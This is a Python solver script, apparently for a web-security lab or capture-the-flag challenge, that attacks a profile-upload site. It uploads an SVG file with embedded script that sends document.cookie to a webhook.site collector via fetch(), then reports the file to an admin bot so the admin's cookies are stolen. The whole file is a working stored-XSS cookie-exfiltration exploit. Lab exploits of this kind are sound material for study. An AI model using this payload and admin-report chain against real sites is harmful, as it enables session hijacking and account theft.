import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

# https://portswigger.net/web-security/file-upload#:~:text=Uploading%20malicious%20client%2Dside%20scripts

import io
import urllib.parse

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def generate_random_string(self, length = 10):
        import random, string
        return ''.join(random.choices(string.ascii_letters, k=length))

    def main(self):
        BASE_URL = "https://profile.quoccacorp.com"

        # Log in
        response = self.session.get(BASE_URL)
        login_url = response.url
        username = self.generate_random_string()
        response = self.session.post(login_url, data={"username": username, "password": username})
        profile_url = response.url

        # Craft SVG File Payload
        SVG_PAYLOAD = f'''<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)
    </script>
</svg>'''
        svg_file = io.BytesIO(SVG_PAYLOAD.encode())
        svg_file.name = "profile.svg"

        # Upload SVG
        response = self.session.post(profile_url, files={"file": (svg_file.name, svg_file)})

        # Report to Admin
        url_encoded_svg_path = urllib.parse.quote(f"/profileimage/{username}.svg")
        self.session.post(f"{BASE_URL}/report", data={"path": url_encoded_svg_path})
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
